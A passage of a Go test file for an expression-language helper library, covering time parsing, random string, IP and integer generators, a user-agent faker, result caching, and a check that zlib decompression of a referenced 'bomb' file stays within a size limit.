			"2022-01-13T16:30:10-00:00": expectedUtcTime,

			// explicit time offset
			"2022-01-13 16:30:10 +01:00": time.Date(2022, 01, 13, 16, 30, 10, 0, time.FixedZone("UTC+1", 60*60)),
			"2022-01-13 16:30 +01:00":    time.Date(2022, 01, 13, 16, 30, 0, 0, time.FixedZone("UTC+1", 60*60)),
			"2022-01-13 +02:00":          time.Date(2022, 01, 13, 0, 0, 0, 0, time.FixedZone("UTC+2", 2*60*60)),
			"2022-01-13 -02:00":          time.Date(2022, 01, 13, 0, 0, 0, 0, time.FixedZone("UTC+2", -2*60*60)),

			// local time
			"2022-01-13 16:30:10": time.Date(2022, 01, 13, 16, 30, 10, 0, time.Local),
			"2022-01-13 16:30":    time.Date(2022, 01, 13, 16, 30, 0, 0, time.Local),
			"2022-01-13":          time.Date(2022, 01, 13, 0, 0, 0, 0, time.Local),
		}

		for dateTimeInput, expectedTime := range dateTimeInputs {
			dslExpression := fmt.Sprintf(`to_unix_time("%s")`, dateTimeInput)
			t.Run(dslExpression, func(t *testing.T) {
				actual := evaluateExpression(t, dslExpression)
				require.Equal(t, expectedTime.Unix(), actual)
			})
		}
	})

	t.Run("to_unix_time(input string, layout string) int", func(t *testing.T) {
		testScenarios := []struct {
			inputDateTime string
			layout        string
			expectedTime  time.Time
		}{
			{"2022-01-13T16:30:10+02:00", time.RFC3339, time.Date(2022, 01, 13, 16, 30, 10, 0, time.FixedZone("UTC+2", 2*60*60))},
			{"13-01-2022 16:30:10", "02-01-2006 15:04:05", time.Date(2022, 01, 13, 16, 30, 10, 0, time.UTC)},
			{"13-01-2022 16:30", "02-01-2006 15:04", time.Date(2022, 01, 13, 16, 30, 0, 0, time.UTC)},
			{"13-01-2022", "02-01-2006", time.Date(2022, 01, 13, 0, 0, 0, 0, time.UTC)},

			{"13-01-2022 16:30:10 +02:00", "02-01-2006 15:04:05 Z07:00", time.Date(2022, 01, 13, 16, 30, 10, 0, time.FixedZone("UTC+2", 2*60*60))},
			{"13-01-2022 16:30 +01:00", "02-01-2006 15:04 Z07:00", time.Date(2022, 01, 13, 16, 30, 0, 0, time.FixedZone("UTC+1", 60*60))},
			{"13-01-2022 -03:30", "02-01-2006 Z07:00", time.Date(2022, 01, 13, 0, 0, 0, 0, time.FixedZone("UTC-3:30", -3*60*60-30*60))},
		}

		for _, testScenario := range testScenarios {
			dslExpression := fmt.Sprintf(`to_unix_time("%s", "%s")`, testScenario.inputDateTime, testScenario.layout)
			t.Run(dslExpression, func(t *testing.T) {
				actual := evaluateExpression(t, dslExpression)
				require.Equal(t, testScenario.expectedTime.Unix(), actual)
			})
		}
	})
}

func TestRandDslExpressions(t *testing.T) {
	randDslExpressions := map[string]string{
		`rand_base(10, "")`:                  `[a-zA-Z0-9]{10}`,
		`rand_base(5, "abc")`:                `[abc]{5}`,
		`rand_base(5)`:                       `[a-zA-Z0-9]{5}`,
		`rand_char("abc")`:                   `[abc]{1}`,
		`rand_char("")`:                      `[a-zA-Z0-9]{1}`,
		`rand_char()`:                        `[a-zA-Z0-9]{1}`,
		`rand_ip("192.168.0.0/24")`:          `(?:[0-9]{1,3}\.){3}[0-9]{1,3}$`,
		`rand_ip("2001:db8::/64")`:           `(?:[A-Fa-f0-9]{0,4}:){0,7}[A-Fa-f0-9]{0,4}$`,
		`rand_text_alpha(10, "abc")`:         `[^abc]{10}`,
		`rand_text_alpha(10, "")`:            `[a-zA-Z]{10}`,
		`rand_text_alpha(10)`:                `[a-zA-Z]{10}`,
		`rand_text_alphanumeric(10, "ab12")`: `[^ab12]{10}`,
		`rand_text_alphanumeric(5, "")`:      `[a-zA-Z0-9]{5}`,
		`rand_text_alphanumeric(10)`:         `[a-zA-Z0-9]{10}`,
		`rand_text_numeric(10, 123)`:         `[^123]{10}`,
		`rand_text_numeric(10)`:              `\d{10}`,
	}

	for randDslExpression, regexTester := range randDslExpressions {
		t.Run(randDslExpression, func(t *testing.T) {
			actualResult := evaluateExpression(t, randDslExpression)

			compiledTester := regexp.MustCompile(fmt.Sprintf("^%s$", regexTester))

			fmt.Printf("%s: \t %v\n", randDslExpression, actualResult)

			stringResult := toString(actualResult)

			require.True(t, compiledTester.MatchString(stringResult), "The result '%s' of '%s' expression does not match the expected regex: '%s'", actualResult, randDslExpression, regexTester)
		})
	}
}

func TestFakerDslExpressions(t *testing.T) {
	res1 := evaluateExpression(t, "rand_chrome_user_agent()")
	res2 := evaluateExpression(t, "rand_chrome_user_agent()")
	require.NotEqual(t, res1, res2, "The result of the res2 is same as the res1")
}

func TestRandIntDslExpressions(t *testing.T) {
	randIntDslExpressions := map[string]func(int) bool{
		`rand_int(5, 9)`: func(i int) bool {
			return i >= 5 && i <= 9
		},
		`rand_int(9)`: func(i int) bool {
			return i >= 9
		},
		`rand_int()`: func(i int) bool {
			return i >= 0 && i <= math.MaxInt32
		},
	}

	for randIntDslExpression, tester := range randIntDslExpressions {
		t.Run(randIntDslExpression, func(t *testing.T) {
			actualResult := evaluateExpression(t, randIntDslExpression)

			actualIntResult := actualResult.(int)
			require.True(t, tester(actualIntResult), "The '%d' result of the '%s' expression, does not match th expected validation function.", actualIntResult, randIntDslExpression)
		})
	}
}

func TestCachingLayer(t *testing.T) {
	var (
		callCount      int
		expectedResult = "static value"
		cacheableFunc  = dslFunction{
			IsCacheable:  true,
			Name:         "cacheable_func",
			NumberOfArgs: 0,
			Signatures:   nil,
			ExpressionFunction: func(args ...interface{}) (interface{}, error) {
				time.Sleep(time.Second)
				callCount++
				return expectedResult, nil
			},
		}
	)

	for i := 0; i < 100; i++ {
		result := evaluateExpression(t, "cacheable_func()", cacheableFunc)
		require.Equal(t, expectedResult, result)
	}
	require.Equal(t, 1, callCount)
}

func evaluateExpression(t *testing.T, dslExpression string, functions ...dslFunction) interface{} {
	helperFunctions := maps.Clone(DefaultHelperFunctions)
	for _, function := range functions {
		helperFunctions[function.Name] = function.Exec
	}
	compiledExpression, err := govaluate.NewEvaluableExpressionWithFunctions(dslExpression, helperFunctions)
	require.NoError(t, err, "Error while compiling the %q expression", dslExpression)

	actualResult, err := compiledExpression.Evaluate(make(map[string]interface{}))
	require.NoError(t, err, "Error while evaluating the compiled %q expression", dslExpression)

	for _, negativeTestWord := range []string{"panic", "invalid", "error"} {
		require.NotContains(t, fmt.Sprintf("%v", actualResult), negativeTestWord)
	}

	return actualResult
}

func testDslExpressions(t *testing.T, dslExpressions map[string]interface{}) {
	for dslExpression, expectedResult := range dslExpressions {
		t.Run(dslExpression, func(t *testing.T) {
			actualResult := evaluateExpression(t, dslExpression)

			if expectedResult != nil {
				require.Equal(t, expectedResult, actualResult)
			}

			fmt.Printf("%s: \t %v\n", dslExpression, actualResult)
		})
	}
}

func Test_GetPrintableDslFunctionSignatures(t *testing.T) {
	fmt.Printf(GetPrintableDslFunctionSignatures(true))
}

func Test_Zlib_decompression_bomb(t *testing.T) {
	compressedFile := "testdata/zlib_bomb.zlib"

	data, err := os.ReadFile(compressedFile)
	require.NoError(t, err)

	dslExpression := `zlib_decode(body)`

	helperFunctions := maps.Clone(DefaultHelperFunctions)
	for _, function := range functions {
		helperFunctions[function.Name] = function.Exec
	}
	compiledExpression, err := govaluate.NewEvaluableExpressionWithFunctions(dslExpression, helperFunctions)
	require.NoError(t, err, "Error while compiling the %q expression", dslExpression)

	actualResult, err := compiledExpression.Evaluate(map[string]interface{}{
		"body": string(data),
	})
	require.NoError(t, err, "Error while evaluating the compiled %q expression", dslExpression)
	// Cannot be greater than 10MB
	require.LessOrEqual(t, int64(len(actualResult.(string))), DefaultMaxDecompressionSize, "The result is too large")
}
